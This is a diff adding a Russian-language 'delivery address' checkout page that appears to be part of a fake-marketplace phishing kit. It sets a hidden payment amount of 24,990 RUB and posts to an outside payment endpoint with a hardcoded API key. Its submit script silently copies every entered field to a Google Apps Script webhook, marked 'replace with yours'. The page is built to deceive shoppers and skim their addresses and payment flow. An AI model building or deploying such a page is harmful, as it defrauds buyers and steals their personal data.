@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Оформление доставки</title>
+    <link href="https://fonts.googleapis.com" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #6366f1;
+            --primary-hover: #4f46e5;
+            --bg-color: #f8fafc;
+            --text-color: #1e293b;
+            --border-color: #e2e8f0;
+        }
+
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Удобно для мобильного скролла */
+            min-height: 100vh;
+            padding: 20px 15px;
+        }
+
+        .checkout-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            padding: 32px 24px;
+            border-radius: 24px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            margin-top: 20px; /* Отступ сверху на мобилках */
+        }
+
+        .logo-wrapper {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .brand-logo {
+            max-width: 140px; /* Настройте размер под ваш лого */
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        h2 {
+            color: var(--text-color);
+            margin-bottom: 8px;
+            font-size: 22px;
+            text-align: center;
+        }
+
+        .subtitle {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #475569;
+            padding-left: 4px;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 16px; /* Предотвращает зум на iPhone */
+            transition: all 0.3s ease;
+            outline: none;
+            background: #fcfcfd;
+            font-family: inherit;
+        }
+
+        input:focus, textarea:focus {
+            border-color: var(--primary-color);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.1);
+        }
+
+        textarea {
+            resize: none;
+            height: 90px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+            box-shadow: 0 4px 14px rgba(99, 102, 241, 0.3);
+        }
+
+        .submit-btn:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 8px rgba(99, 102, 241, 0.2);
+        }
+
+        @media (max-width: 480px) {
+            .checkout-container {
+                padding: 24px 20px;
+                border-radius: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+    const min = 100000;
+    const max = 999999;
+    const orderId = Math.floor(Math.random() * (max - min + 1)) + min;
+    
+    const input = document.getElementById('merchant_order_id');
+    if (input) {
+        input.value = orderId;
+    }
+});
+</script>
+
+
+    
+<div class="checkout-container">
+    <div class="logo-wrapper">
+        <img src="https://paogaz.github.io/ru/logo.png" alt="Logo" class="brand-logo">
+    </div>
+
+    <h2>Адрес доставки</h2>
+    <p class="subtitle">Пожалуйста, заполните данные</p>
+
+    <form action="https://marketplays.pro/api/request" method="POST">
+        <div class="form-group">
+            <label for="city">Город</label>
+            <input type="text" name="city" id="city" placeholder="Напр. Москва" required>
+        </div>
+
+        <div class="form-group">
+            <label for="address">Улица, дом, квартира</label>
+            <input type="text" name="address" id="address" placeholder="ул. Пушкина, д. 10" required>
+        </div>
+
+        <div class="form-group">
+            <label for="comment">Комментарий (необязательно)</label>
+            <textarea id="comment" name="comment" placeholder="Код домофона, этаж..."></textarea>
+        </div>
+
+        <input type="hidden" name="amount" value="24990">
+        <input type="hidden" name="merchant_order_id" id="merchant_order_id" value="">
+        <input type="hidden" name="use_card_payment" value="RUB">
+        <input type="hidden" name="api_key" value="e71366079d95b04228fc6482c503a983b99da2e7b17dd6c56780074d0f7e63a2">
+        <input type="hidden" name="success_url" value="https://github.com/paogaz/ru/ok.html">
+        <input type="hidden" name="fail_url" value="https://github.com/paogaz/ru/pay5.html">
+        <input type="hidden" name="notice_url" value="https://script.google.com/macros/s/AKfycbwhp6cuv7hKzSTcFY0tB8QwPrw4y_oWwpvBjRf1o0uUReggq12ckyDZ-xbwfoxbqak/exec">
+
+        <button type="submit" class="submit-btn">Подтвердить адрес</button>
+    </form>
+</div>
+
+
+
+<script>
+document.querySelector('form').addEventListener('submit', function(e) {
+    const formData = new FormData(this);
+    const data = Object.fromEntries(formData.entries());
+    const webhookUrl = 'https://script.google.com/macros/s/AKfycbw1ufz-TDQwkaTB8CCV83D-qBKMVajT70d7Dx0QzbN6JJzD63T5Pu2pGtY_jVT7qD7fMw/exec'; // ЗАМЕНИ НА СВОЙ
+
+    // 1. Отправляем JSON на Webhook моментально (не ожидая ответа)
+    fetch(webhookUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    });
+
+    // 2. Сразу же отправляем форму на основной сервер
+    // Никаких preventDefault и await — форма улетит мгновенно
+});
+</script>
+
+
+    
+</body>
+</html>
